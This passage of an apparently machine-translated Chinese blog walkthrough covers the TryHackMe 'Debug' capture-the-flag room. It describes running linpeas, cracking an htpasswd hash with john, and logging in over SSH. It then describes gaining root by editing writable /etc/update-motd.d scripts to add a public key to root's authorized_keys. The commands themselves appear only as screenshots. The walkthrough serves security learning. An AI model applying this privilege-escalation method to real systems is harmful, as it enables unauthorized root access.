fr fs kq fu fw dk translated">github.com</p></div></div><div class="kt l"><div class="nl l kv kw kx kt ky jw kk"/></div></div></a></div><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nm"><img src="../Images/26ef44416c0b629daf9f408cd1dbdf91.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1z0Ezkvh-hBQnpdXDefS1Q.png"/></div></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">Linpeas跑步</figcaption></figure><p id="e8a6" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">我们在目标机器上运行linpeas</p><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div class="gh gi nn"><img src="../Images/d349e3ae7c82ce7cb24e7b847f194198.png" data-original-src="https://miro.medium.com/v2/resize:fit:1378/format:webp/1*ynbS132d_u9iAzRBpNPR2Q.png"/></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">Linpeas结果</figcaption></figure><p id="1873" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">这里的Linpeas提供了我们需要的一切，在它执行的最后，它提供了一些非常有价值的信息</p><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div class="gh gi no"><img src="../Images/147549f975e732395683393e23a9ce3e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1102/format:webp/1*O_Q46-QepvQDACpZKTGWEw.png"/></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">。web根目录下的htpasswd文件</figcaption></figure><p id="127c" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">然后，我们可以将这个散列复制到我们的机器上，并在其上执行john</p><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi np"><img src="../Images/8eb6e51548440f497c6ff36b2a60a693.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QZ4Nu4uglrmqkZd3ON-1qQ.png"/></div></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">开裂。与john一起使用htpasswd哈希</figcaption></figure><p id="107a" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">现在，我们可以尝试使用这些凭据通过ssh访问机器</p><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nq"><img src="../Images/3b0c25456da14241443c585ab4b82b76.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*voYq-1DM_v6oPzP8GQ6lFg.png"/></div></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">通过ssh登录</figcaption></figure><p id="f375" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">我们有ssh访问权限</p><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nr"><img src="../Images/ff5267830ab1b60993ec48622eddd496.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Lc0flg-E1LrHi1I967jllA.png"/></div></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">ssh用户主目录和有趣的文件</figcaption></figure><p id="d18e" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">和user.txt文件作为标志</p><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div class="gh gi ns"><img src="../Images/c4bbfa4a1b47ea51029ea23a71111b3a.png" data-original-src="https://miro.medium.com/v2/resize:fit:578/format:webp/1*UDW8XLBXfYMci4XgjK7-Cg.png"/></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">user.txt</figcaption></figure><p id="e424" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">在用户主目录中，我们看到有一个“Note”文件，其中包含来自root用户的一些信息</p><p id="852b" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">据说当前的ssh用户拥有更改MOTD的特权</p><p id="4c88" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">从linpeas，网络服务器上的目录列表和apache UBUNTU默认网页，我们知道我们在一台UBUNTU机器上</p><p id="5dda" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">在谷歌上快速搜索一下，我们会发现一篇关于MOTD在ubuntu上的位置的旧但有趣的博客文章</p><div class="kh ki gp gr kj kk"><a href="https://ownyourbits.com/2017/04/05/customize-your-motd-login-message-in-debian-and-ubuntu/" rel="noopener  ugc nofollow" target="_blank"><div class="kl ab fo"><div class="km ab kn cl cj ko"><h2 class="bd ir gy z fp kp fr fs kq fu fw ip bi translated">在Debian和Ubuntu中定制你的MOTD登录信息</h2><div class="kr l"><h3 class="bd b gy z fp kp fr fs kq fu fw dk translated">bin/sh # #更新-motd -立即更新动态MOTD # #版权所有(C) 2008-2014达斯汀·柯克兰# #作者…</h3></div><div class="ks l"><p class="bd b dl z fp kp fr fs kq fu fw dk translated">ownyourbits.com</p></div></div><div class="kt l"><div class="nt l kv kw kx kt ky jw kk"/></div></div></a></div><p id="e88b" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">事实上，我们可以在/etc/update-motd.d中找到motd脚本</p><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div class="gh gi nu"><img src="../Images/46483888d6eb26954b0a4194c36a52c2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1164/format:webp/1*Y-QurQWtCiXUrKoTcHrpNw.png"/></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">/etc/update-motd.d/文件</figcaption></figure><p id="3fab" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">这些脚本被设置为可执行文件，并在用户登录机器时以root用户身份执行</p><p id="ead2" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">通过向这些脚本添加命令，我们可以执行我们想要的任何命令，并且可以编辑它们，因为这些文件的所有者组已经设置为我们的用户</p><p id="0925" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">更多信息请点击此处</p><div class="kh ki gp gr kj kk"><a href="http://manpages.ubuntu.com/manpages/trusty/man5/update-motd.5.html" rel="noopener  ugc nofollow" target="_blank"><div class="kl ab fo"><div class="km ab kn cl cj ko"><h2 class="bd ir gy z fp kp fr fs kq fu fw ip bi translated">Ubuntu联机帮助页:更新-motd -动态motd生成</h2><div class="kr l"><h3 class="bd b gy z fp kp fr fs kq fu fw dk translated">提供:libpam-modules _ 1 . 1 . 8-1 Ubuntu 2 _ amd64名称更新-motd -动态motd生成概要…</h3></div><div class="ks l"><p class="bd b dl z fp kp fr fs kq fu fw dk translated">manpages.ubuntu.com</p></div></div></div></a></div><p id="0323" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">从前面linpeas的执行中，我们知道允许root通过ssh登录，所以我们可以尝试向root的authorized_keys /root/添加一个ssh公钥。ssh/目录</p><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div class="gh gi nv"><img src="../Images/91dd834a1aa60b2a4dfbf0f74c92bbea.png" data-original-src="https://miro.medium.com/v2/resize:fit:906/format:webp/1*TGmdOTG8OQP1pTy-qqo6xA.png"/></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">Linpeas SSH文件部分</figcaption></figure><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div class="gh gi nw"><img src="../Images/14f0f4cbf3139714fb05eac93f345270.png" data-original-src="https://miro.medium.com/v2/resize:fit:1168/format:webp/1*LUa1W1LwCaFG4NaCOhWYDg.png"/></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">生成SSH密钥对</figcaption></figure><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div class="gh gi nx"><img src="../Images/12a4087e79e544546d76f4561dd2df30.png" data-original-src="https://miro.medium.com/v2/resize:fit:678/format:webp/1*2H8Px0BygQAbK2aPgaRfbw.png"/></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">复制公钥</figcaption></figure><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ny"><img src="../Images/b8e75af6d8e1fd915717d663b69cc1a5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RR6vbM3cU2oGJziMkOZX0w.png"/></div></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">从复制的公钥文件中删除用户名，我知道它太小了</figcaption></figure><p id="9afd" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">将公钥复制到用户主目录，并从公钥中删除用户名</p><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div class="gh gi nz"><img src="../Images/fe96836c012f1ba4a599768199e6aad4.png" data-original-src="https://miro.medium.com/v2/resize:fit:840/format:webp/1*D_h1nXRqY-Md4KgWbpFVcw.png"/></div></figure><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi oa"><img src="../Images/726af237c34c58ad358f392d0ba1b51d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*aN12_HLpDw-5XmgrjKKliw.png"/></div></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">编辑MOTD的一个剧本</figcaption></figure><p id="c217" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">在任一motd文件中添加命令，将用户公钥附加到root的授权密钥中</p><p id="b450" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">现在退出ssh会话，使用相同的用户再次登录，然后尝试使用新创建的私钥在本地主机上进行ssh</p><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div class="gh gi mq"><img src="../Images/8806b22489960b0f5076ff386584daac.png" data-original-src="https://miro.medium.com/v2/resize:fit:1192/format:webp/1*RXNs1nx9ebUZhkh5H0q-jA.png"/></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">有根！</figcaption></figure><p id="1159" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">我们是root用户，可以读取root.txt中的标志</p><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div class="gh gi ob"><img src="../Images/2378f50d1b775190a687c98c6235a401.png" data-original-src="https://miro.medium.com/v2/resize:fit:588/format:webp/1*MgSiRl3AXGSXTRLUWeC3Gg.png"/></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">root.txt标志</figcaption></figure><p id="4e09" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">TryHackMe调试室到此结束</p><p id="f415" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">我希望你喜欢它。</p><p id="4a89" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">PVXs</p><div class="kh ki gp gr kj kk"><a href="https://tryhackme.com/p/PVXs" rel="noopener  ugc nofollow" target="_blank"><div class="kl ab fo"><div class="km ab kn cl cj ko"><h2 class="bd ir gy z fp kp fr fs kq fu fw ip bi translated">TryHackMe | PVXs</h2><div class="kr l"><h3 class="bd b gy z fp kp fr fs kq fu fw dk translated">TryHackMe是一个免费的学习网络安全的在线平台，使用动手练习和实验室，通过您的…</h3></div><div class="ks l"><p class="bd b dl z fp kp fr fs kq fu fw dk translated">tryhackme.com</p></div></div><div class="kt l"><div class="oc l kv kw kx kt ky jw kk"/></div></div></a></div></div></div>    
</body>
</html>